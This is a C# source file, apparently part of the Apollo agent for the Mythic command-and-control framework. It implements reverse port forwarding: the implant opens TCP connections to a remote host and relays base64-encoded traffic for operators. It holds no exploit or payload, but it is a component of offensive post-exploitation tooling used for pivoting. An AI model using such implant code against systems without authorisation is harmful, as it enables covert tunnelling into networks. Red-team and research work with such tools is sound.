using Newtonsoft.Json;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using Apollo.RPortFwdProxy.Classes;
using Mythic.Structs;
using System.Runtime.Serialization;
using System.Collections;
using Apollo.CommandModules;
using System.Windows.Forms;
using System.Runtime.Remoting.Contexts;
using static Utils.DebugUtils;
using static Utils.ByteUtils;
using Utils.ErrorUtils;
using Apollo.SocksProxy.Enums;
using Apollo.SocksProxy.Structs;

namespace Apollo.RPortFwdProxy.Classes
{
    public class ProxyConnection
    {

        public string MythicPort;
        public string RemotePort;
        public string RemoteIp;

        public bool reconSignal = false;
        public int last_msg = 0;
        private object syncMapQueue = new Object();
	private object syncMapMsg = new Object();
	private object syncMapConn = new Object();
        //public Dictionary<String,Dictionary<String,Dictionary<String,List<String>>>> messages_back = new Dictionary<String,Dictionary<String,Dictionary<String,List<String>>>>();
        public Dictionary<string, Queue<String>> operatorMapQueue = new Dictionary<string, Queue<String>>();
        public Dictionary<string, Thread> operatorReadQueue = new Dictionary<string, Thread>();

        //public Dictionary<string, Object> queueLockerMsgBack = new Dictionary<string, Object>();
        //public Dictionary<string, Object> queueLocker = new Dictionary<string, Object>();
	public Dictionary<string, int> operatorState = new Dictionary<string, int>();
	public Dictionary<string, Socket> operatorMapConn = new Dictionary<string, Socket>();
        public Dictionary<String, Queue<String>> messages_back = new Dictionary<String, Queue<String>>();

        public static Thread operatorDispatchDatagram;

        private static Random rnd = new Random();

        private bool exited = false;

        public ProxyConnection(string port, string rport, string rip)
        {
            MythicPort = port;
            RemotePort = rport;
            RemoteIp = rip;

            operatorDispatchDatagram = new Thread(() => DispatchToOperators());
            operatorDispatchDatagram.Start();
        }

        public string GetConfs()
        {
            return "[+] Local Port: " + MythicPort + " - Remote Port: " + RemotePort + " - Remote IP: " + RemoteIp;
        }

        public void StopForward()
        {
	    List<string> operators = null;
            lock(syncMapConn){
		exited = true;
                operators = new List<string>(operatorMapConn.Keys);
	        foreach (string entry in operators)
                {
		    if (operatorMapConn[entry] != null){
                        try{
			    operatorMapConn[entry].Shutdown(SocketShutdown.Both);
		            operatorMapConn[entry].Close();
		        }catch{}
		        try{
		            operatorMapQueue[entry].Clear();
		        }catch{}
		    }
		}
            }
        }

        private void DispatchToOperators()
        {
            try{
                while (!exited)
                {
		    List<string> operators = new List<string>(operatorMapQueue.Keys);

		    while(operators.Count == 0){
                        operators = new List<string>(operatorMapQueue.Keys);

		    }
		    foreach (string entry in operators)
                    {
                        if (operatorMapConn.ContainsKey(entry) == false)
                        {
			    lock(syncMapConn){
		                operatorMapConn[entry] = null;
			        Socket new_operatorconn = null;
			        operatorMapConn[entry] = initConn();
			    }
			    if (operatorMapConn[entry] != null){
                                operatorState[entry] = 0;
      			        Thread thread = new Thread(() => ReadFromTarget(entry));
                                operatorReadQueue[entry] = thread;
		                operatorReadQueue[entry].Start();
			    }
			}
			while (operatorMapQueue[entry].Count > 0)
                        {
                            if (operatorMapConn[entry] != null){

			        string base64data = "";

				lock(syncMapQueue){
				    base64data = (string)operatorMapQueue[entry].Dequeue();
				}

			        byte[] data = Convert.FromBase64String(base64data);
                                try{
			            operatorMapConn[entry].Send(data);
				    operatorState[entry] = 1;
				}catch{

                                        //operatorMapConn[entry].Shutdown(SocketShutdown.Both);
				        //operatorMapConn[entry].Close();
				    lock(syncMapConn){
				        operatorMapConn[entry] = null;
				    }
				}
                            }
			}
                    }
                }
	    // keep reading from operatorMapQueue and send to operatorMapConn
            }catch{ }
        }

        public void AddDatagramToQueueProx(PortIpRelationDatagram msgs)
        {
            try{//KeyValuePair<string, ProxyConnection> entry
                Dictionary<String, ConnectionPacketNumRelationDatagram> dict_conn = msgs.connection_packet_relation_dtg.Item3.conn_packets_relation;
                foreach(KeyValuePair<String, ConnectionPacketNumRelationDatagram> entry_conn in dict_conn)
                {
                    if (!operatorMapQueue.ContainsKey(entry_conn.Key))
                    {
                        operatorMapQueue[entry_conn.Key] = new Queue<String>();
	                }
	                string operatorId = entry_conn.Key;
                    Dictionary<int,String> dict_conn2 = entry_conn.Value.packetid_value_relation;
                    foreach(KeyValuePair<int, String> entry_packet in dict_conn2)
                    {

			            lock(syncMapQueue){
				            operatorMapQueue[entry_conn.Key].Enqueue(entry_packet.Value);
                            if(entry_packet.Key == -1)
                            {
                                reconSignal = true;
                                last_msg = 0;
                            }
                        }

			        }
			    }
	        }catch{}
        }


        // TODO
        public PortIpRelationDatagram GetMessagesBack()
        {
            PortIpRelationDatagram tuple_rport_ip = new PortIpRelationDatagram();
            try{

	            List<string> operators = new List<string>(operatorMapConn.Keys);
                ConnectionPacketsRelationDatagram conn_operators = new ConnectionPacketsRelationDatagram();
                conn_operators.conn_packets_relation = new Dictionary<String, ConnectionPacketNumRelationDatagram>();


	            foreach (string entry in operators)
                {
	                string operatorId = entry;
	                ConnectionPacketNumRelationDatagram msgs = new ConnectionPacketNumRelationDatagram();
                    msgs.packetid_value_relation = new Dictionary<int, String>();
	                if (messages_back.ContainsKey(entry)){
                        lock(syncMapMsg){
                            while(messages_back[entry].Count > 0)
		                    {
				                msgs.packetid_value_relation[last_msg] = messages_back[entry].Dequeue();
                                last_msg = last_msg + 1;
		                   }
			            }
		                conn_operators.conn_packets_relation[operatorId] = msgs;
		            }
                }
                tuple_rport_ip.connection_packet_relation_dtg = new Tuple<string, string, ConnectionPacketsRelationDatagram>(RemotePort, RemoteIp, conn_operators);


	        }catch {}
            return tuple_rport_ip;
        }

        public void ReadFromTarget(string oper)
        {
            string oper_aux_str = oper;
	    while(operatorState[oper] == 0){
                Thread.Sleep(100);
	    }
            lock(syncMapMsg){
	        if (messages_back.ContainsKey(oper) == false)
                {
                    Queue<String> message_list = new Queue<String>();
                    messages_back[oper] = message_list;
                    last_msg = 0;
                }
	    }
	    while(exited == false){
		try{
	            byte[] data = new byte[8192];
		    int size_data = 0;

		    size_data = operatorMapConn[oper].Receive(data);
                    byte[] trimmed_data = data.Take(size_data).ToArray();
                    string data_Base64 = Convert.ToBase64String(trimmed_data);
		    if(data_Base64 != ""){
			lock(syncMapMsg){
                            if(reconSignal == true)
                            {
                                Queue<String> message_list_aux = new Queue<String>();
                                messages_back[oper] = message_list_aux;
                                int oper_aux = Int32.Parse(oper) + 1;
                                oper_aux_str = oper_aux.ToString();
                                reconSignal = false;
                            }
		            messages_back[oper_aux_str].Enqueue(data_Base64);
			}
		    }
		}catch(Exception ex){


			//operatorMapConn[oper].Shutdown(SocketShutdown.Both);
			//operatorMapConn[oper].Close();
                    operatorMapConn[oper] = null;
		    break;
		}
	    }
	}


        public Socket initConn()
        {
	    Socket socketOperator = null;
            try{
	    	IPEndPoint remoteEPC2 = new IPEndPoint(System.Net.IPAddress.Parse(RemoteIp), Convert.ToInt32(RemotePort));
                socketOperator = new Socket(System.Net.IPAddress.Parse(RemoteIp).AddressFamily, SocketType.Stream, ProtocolType.Tcp);
                socketOperator.Connect(remoteEPC2);
	        return socketOperator;
	    }catch(Exception ex){
	        return socketOperator;
	    }
        }

    }
}
